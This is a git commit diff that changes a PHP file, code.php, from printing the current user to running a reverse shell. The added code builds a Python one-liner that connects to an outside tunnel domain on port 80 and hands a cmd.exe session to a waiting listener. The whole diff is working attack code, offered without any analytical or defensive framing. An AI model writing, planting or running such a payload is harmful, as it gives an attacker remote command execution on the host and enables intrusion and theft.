44eefe11e2c0fa743737f8efb21218390add0fb7
Zzscript <147871556+antonysimoncodes@users.noreply.github.com>
2025-08-18 23:03:03 +0530

    code.php

--- code.php
+++ code.php
@@ -1,3 +1,14 @@
 <?php
-echo "Running as: " . get_current_user();
+$domain = 'ad6aa00c0584b1.lhr.life'; // use the domain name
+$port = 80; // must match your listener port
+
+$cmd = "python -c \"import socket,subprocess,os;" .
+       "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);" .
+       "s.connect(('$domain',$port));" .
+       "os.dup2(s.fileno(),0);" .
+       "os.dup2(s.fileno(),1);" .
+       "os.dup2(s.fileno(),2);" .
+       "subprocess.call(['cmd.exe'])\"";
+
+system($cmd);
 ?>
